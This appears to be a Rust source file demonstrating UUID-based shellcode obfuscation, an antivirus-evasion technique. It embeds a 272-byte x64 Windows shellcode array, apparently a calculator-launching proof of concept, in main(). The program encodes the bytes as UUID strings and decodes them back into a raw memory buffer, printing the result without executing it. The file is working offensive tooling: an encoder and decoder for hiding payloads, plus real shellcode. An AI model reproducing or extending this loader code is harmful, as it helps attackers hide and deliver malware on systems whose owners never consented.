use std::fmt::Write;
use std::error::Error;
use uuid::Uuid;

#[derive(Debug)]
pub struct DeobfuscationResult {
    pub ptr: *mut u8,
    pub size: usize,
}


pub fn uuid_deobfuscation_ffi(uuid_array: &Vec<String>) -> Result<DeobfuscationResult, Box<dyn Error>> {

    let required_size = uuid_array.len() * 16;
    let mut buffer = Vec::with_capacity(required_size);

    for uuid_str in uuid_array {
        let uuid = Uuid::parse_str(uuid_str).map_err(|e| {
            format!("Failed to parse UUID: {}. Error: {}", uuid_str, e)
        })?;

        buffer.extend_from_slice(uuid.as_bytes());
    }

    let box_slice = buffer.into_boxed_slice();
    let size = box_slice.len();
    let ptr = Box::into_raw(box_slice) as *mut u8;

    Ok(DeobfuscationResult {
        ptr,
        size,
    })
}

pub unsafe fn free_deobfuscation(result: DeobfuscationResult) {
    if result.ptr.is_null() {
        return;
    }

    let _ = Box::from_raw(std::slice::from_raw_parts_mut(result.ptr, result.size));
    // The Box will be automatically dropped here, freeing the memory.
}

fn GenerateUUID(a : u32,  b : u32,  c : u32,  d : u32,  e : u32,  f : u32,  g : u32,  h : u32,  i : u32,  j : u32,  k : u32,  l : u32,  m : u32,  n : u32,  o : u32,  p : u32) -> String{

    let mut uuid_str = String::new();
    write!(
        uuid_str,
        "{:02X}{:02X}{:02X}{:02X}-{:02X}{:02X}-{:02X}{:02X}-{:02X}{:02X}-{:02X}{:02X}{:02X}{:02X}{:02X}{:02X}",
        d, c, b, a,   // Data1: 4 bytes → 8 hex digits
        f, e,         // Data2: 2 bytes → 4 hex digits
        h, g,         // Data3: 2 bytes → 4 hex digits
        i, j,         // First 2 bytes of Data4: 2 bytes → 4 hex digits
        k, l, m, n, o, p
    );

    println!("UUID: {}", uuid_str); 
    uuid_str

}

fn GenerateUuidOutput(shellcode: [u32; 272]) -> Vec<String> {

    if shellcode.len() % 16 != 0 {
        panic!("Shellcode length is not a multiple of 16");
    }
    let mut uuids: Vec<String> = Vec::new();

    for chunk in shellcode.chunks(16) {
        if chunk.len() == 16 {
            let uuid = GenerateUUID(
                chunk[0], chunk[1], chunk[2], chunk[3],
                chunk[4], chunk[5], chunk[6], chunk[7],
                chunk[8], chunk[9], chunk[10], chunk[11],
                chunk[12], chunk[13], chunk[14], chunk[15]
            );
            println!("UUID: {}", uuid);
            uuids.push(uuid);
        }
    }

    uuids
}

fn main() -> Result<(), Box<dyn Error>>{
    let shellcode: [u32; 272] = [
        0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51,
        0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52,
        0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52, 0x20, 0x48, 0x8B, 0x72,
        0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
        0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1, 0xC9, 0x0D, 0x41,
        0x01, 0xC1, 0xE2, 0xED, 0x52, 0x41, 0x51, 0x48, 0x8B, 0x52, 0x20, 0x8B,
        0x42, 0x3C, 0x48, 0x01, 0xD0, 0x8B, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48,
        0x85, 0xC0, 0x74, 0x67, 0x48, 0x01, 0xD0, 0x50, 0x8B, 0x48, 0x18, 0x44,
        0x8B, 0x40, 0x20, 0x49, 0x01, 0xD0, 0xE3, 0x56, 0x48, 0xFF, 0xC9, 0x41,
        0x8B, 0x34, 0x88, 0x48, 0x01, 0xD6, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
        0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0x38, 0xE0, 0x75, 0xF1,
        0x4C, 0x03, 0x4C, 0x24, 0x08, 0x45, 0x39, 0xD1, 0x75, 0xD8, 0x58, 0x44,
        0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0, 0x66, 0x41, 0x8B, 0x0C, 0x48, 0x44,
        0x8B, 0x40, 0x1C, 0x49, 0x01, 0xD0, 0x41, 0x8B, 0x04, 0x88, 0x48, 0x01,
        0xD0, 0x41, 0x58, 0x41, 0x58, 0x5E, 0x59, 0x5A, 0x41, 0x58, 0x41, 0x59,
        0x41, 0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0x52, 0xFF, 0xE0, 0x58, 0x41,
        0x59, 0x5A, 0x48, 0x8B, 0x12, 0xE9, 0x57, 0xFF, 0xFF, 0xFF, 0x5D, 0x48,
        0xBA, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x8D,
        0x01, 0x01, 0x00, 0x00, 0x41, 0xBA, 0x31, 0x8B, 0x6F, 0x87, 0xFF, 0xD5,
        0xBB, 0xE0, 0x1D, 0x2A, 0x0A, 0x41, 0xBA, 0xA6, 0x95, 0xBD, 0x9D, 0xFF,
        0xD5, 0x48, 0x83, 0xC4, 0x28, 0x3C, 0x06, 0x7C, 0x0A, 0x80, 0xFB, 0xE0,
        0x75, 0x05, 0xBB, 0x47, 0x13, 0x72, 0x6F, 0x6A, 0x00, 0x59, 0x41, 0x89,
        0xDA, 0xFF, 0xD5, 0x63, 0x61, 0x6C, 0x63, 0x00
    ];

    let uuids = GenerateUuidOutput(shellcode);

    let result = uuid_deobfuscation_ffi(&uuids).unwrap();
    println!("Deobfuscated ptr: {:?}", result.ptr);
    println!("Deobfuscated size: {:?}", result.size);

    unsafe {
        let slice = std::slice::from_raw_parts(result.ptr, result.size);
        let hex_string = slice.iter()
            .map(|byte| format!("{:02X}", byte))
            .collect::<Vec<String>>()
            .join(" ");
        println!("Deobfuscated hex string: {}", hex_string);
        free_deobfuscation(result);
    }

    Ok(())
}
